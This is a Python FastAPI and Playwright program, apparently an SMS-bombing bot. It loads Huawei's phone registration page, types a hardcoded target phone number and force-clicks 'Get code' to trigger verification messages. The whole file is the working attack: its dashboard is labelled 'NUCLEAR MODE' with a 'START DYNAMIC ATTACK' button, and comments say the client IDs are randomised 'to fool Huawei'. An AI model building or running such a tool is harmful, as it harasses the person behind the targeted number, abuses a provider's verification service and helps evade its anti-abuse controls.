import os
import glob
import asyncio
import random
from datetime import datetime
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
TARGET_PHONE = "3177635849"
CAPTURE_DIR = "./captures"

app = FastAPI()
if not os.path.exists(CAPTURE_DIR): os.makedirs(CAPTURE_DIR)
app.mount("/captures", StaticFiles(directory=CAPTURE_DIR), name="captures")

# --- LOGGING ---
logs = []
def log_msg(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    entry = f"[{timestamp}] {message}"
    print(entry)
    logs.insert(0, entry)
    if len(logs) > 100: logs.pop()

# --- DYNAMIC URL GENERATOR ---
def get_magic_url():
    # Base Values
    base_client_id = 101476933
    base_type = 61
    
    # Randomize to fool Huawei
    # Type ko 61 se 99 k darmian rakhte hain taake format same rahe
    new_type = base_type + random.randint(1, 20) 
    
    # Client ID ko barhate hain (Structure same, bas number naya)
    random_increment = random.randint(150, 5000)
    new_client_id = base_client_id + random_increment
    
    log_msg(f"🆔 New Identity Generated: Type={new_type}, ID={new_client_id}")
    
    # Construct URL dynamically
    url = f"https://id5.cloud.huawei.com/CAS/mobile/standard/register/wapRegister.html?reqClientType={new_type}&loginChannel=61000000&regionCode=pk&loginUrl=https%3A%2F%2Fid5.cloud.huawei.com%2FCAS%2Fmobile%2Fstandard%2FwapLogin.html&lang=en-us&themeName=huawei&clientID={new_client_id}&service=https%3A%2F%2Foauth-login.cloud.huawei.com%2Foauth2%2Fv2%2Fauthorize%3Faccess_type%3Doffline&from=login/wapRegister/regByPhone#/wapRegister/regByPhone"
    return url

# --- DASHBOARD ---
@app.get("/", response_class=HTMLResponse)
async def dashboard():
    return """
    <html>
    <head>
        <title>Huawei Force Bot</title>
        <style>
            body { background: #000; color: #ffeb3b; font-family: monospace; padding: 20px; text-align: center; }
            .box { border: 1px solid #333; padding: 15px; margin: 10px auto; max-width: 800px; background: #111; }
            button { padding: 15px 30px; font-weight: bold; cursor: pointer; border:none; margin:5px; background: #e74c3c; color: white; font-size: 16px; border-radius: 5px; }
            .logs { height: 350px; overflow-y: auto; text-align: left; border: 1px solid #444; padding: 10px; color: #ddd; font-size: 14px; }
            .gallery img { height: 160px; border: 2px solid #555; margin: 4px; border-radius: 4px; }
        </style>
    </head>
    <body>
        <h1>☢️ HUAWEI NUCLEAR MODE</h1>
        <div class="box">
            <button onclick="startBot()">🚀 START DYNAMIC ATTACK</button>
            <button onclick="refreshData()" style="background: #3498db;">🔄 REFRESH</button>
        </div>
        <div class="box logs" id="logs">Waiting...</div>
        <div class="box gallery" id="gallery"></div>
        <script>
            function startBot() {
                fetch('/start', {method: 'POST'});
                document.getElementById('logs').innerHTML = "<div>>>> STARTING...</div>" + document.getElementById('logs').innerHTML;
                setTimeout(refreshData, 2000);
            }
            function refreshData() {
                fetch('/status').then(r=>r.json()).then(d=>{
                    document.getElementById('logs').innerHTML = d.logs.map(l=>`<div>${l}</div>`).join('');
                    document.getElementById('gallery').innerHTML = d.images.map(i=>`<a href="${i}" target="_blank"><img src="${i}"></a>`).join('');
                });
            }
        </script>
    </body>
    </html>
    """

@app.get("/status")
async def get_status():
    files = sorted(glob.glob(f'{CAPTURE_DIR}/*.jpg'), key=os.path.getmtime, reverse=True)
    urls = [f"/captures/{os.path.basename(f)}" for f in files]
    return JSONResponse({"logs": logs, "images": urls})

@app.post("/start")
async def start_bot(bt: BackgroundTasks):
    log_msg(">>> COMMAND: Dynamic ID + Force Click")
    bt.add_task(run_nuclear_agent)
    return {"status": "started"}

# --- HELPER: RED DOT VISUAL ---
async def show_red_dot(page, x, y):
    await page.evaluate(f"""
        var d = document.createElement('div');
        d.style.position='absolute';d.style.left='{x-10}px';d.style.top='{y-10}px';
        d.style.width='20px';d.style.height='20px';d.style.background='red';
        d.style.borderRadius='50%';d.style.zIndex='99999';d.style.border='2px solid white';
        d.style.pointerEvents='none'; 
        document.body.appendChild(d);
    """)

# --- MAIN LOGIC ---
async def run_nuclear_agent():
    try:
        for f in glob.glob(f"{CAPTURE_DIR}/*"): os.remove(f)

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
            context = await browser.new_context(
                viewport={"width": 412, "height": 915},
                device_scale_factor=2.0,
                is_mobile=True,
                has_touch=True
            )
            page = await context.new_page()

            # 1. Generate NEW URL
            dynamic_url = get_magic_url()
            log_msg("🚀 Loading Page with New ID...")
            await page.goto(dynamic_url)
            
            try:
                await page.wait_for_selector("text=Phone number", timeout=15000)
                log_msg("✅ Page Loaded.")
            except:
                log_msg("⚠️ Warning: Load timeout...")
            
            await asyncio.sleep(2)
            await page.screenshot(path=f"{CAPTURE_DIR}/01_loaded.jpg")

            # 2. FILL PHONE
            phone_input = page.locator("input[type='tel']")
            if await phone_input.count() > 0:
                # Click to focus
                await phone_input.first.click()
                await asyncio.sleep(0.5)
                # Type number
                await phone_input.first.fill(TARGET_PHONE)
                log_msg(f"⌨️ Filled: {TARGET_PHONE}")
                await asyncio.sleep(1)
                
                # CRITICAL STEP: BLUR (Click outside to activate button)
                log_msg("🖱️ Clicking outside to deactivate input...")
                await page.mouse.click(10, 10) # Click on top corner (empty space)
                await asyncio.sleep(1)
                await page.screenshot(path=f"{CAPTURE_DIR}/02_filled_blurred.jpg")
            else:
                log_msg("❌ ERROR: Input not found!")
                return

            # 3. NUCLEAR CLICK (JS FORCE)
            log_msg("☢️ Initiating Nuclear Click on 'Get code'...")
            get_code_btn = page.get_by_text("Get code")
            
            if await get_code_btn.count() > 0:
                # Visual Indicator
                box = await get_code_btn.first.bounding_box()
                if box:
                    await show_red_dot(page, box['x']+box['width']/2, box['y']+box['height']/2)
                    await page.screenshot(path=f"{CAPTURE_DIR}/03_target_acquired.jpg")

                # --- THE TRICK ---
                # Hum Playwright ka click nahi, JavaScript ka click use karenge
                # Ye browser k andar ghus kar element.click() call karega
                log_msg("⚡ Executing JS Force Click...")
                await get_code_btn.first.evaluate("element => element.click()")
                
                # Backup: Dispatch Touch Events (Mobile specific force)
                await asyncio.sleep(0.5)
                log_msg("⚡ Dispatching Touch Event (Backup)...")
                await get_code_btn.first.evaluate("""element => {
                    const event = new Event('touchstart', { bubbles: true });
                    element.dispatchEvent(event);
                    element.click();
                }""")
                
                log_msg("✅ Click Commands Sent!")
            else:
                log_msg("❌ ERROR: Button not found!")

            # 4. MONITORING
            log_msg("👀 Watching for CAPTCHA (60s)...")
            for i in range(1, 31):
                await asyncio.sleep(2)
                timestamp = datetime.now().strftime("%M-%S")
                path = f"{CAPTURE_DIR}/monitor_{i}_{timestamp}.jpg"
                await page.screenshot(path=path)
                
                # Check for changes
                content = await page.content()
                if "iframe" in content or "dialog" in content:
                    log_msg(f"⚠️ CAPTCHA DETECTED (Frame {i})")

            log_msg("✅ Sequence Ended.")
            await browser.close()

    except Exception as e:
        log_msg(f"❌ CRASH: {str(e)}")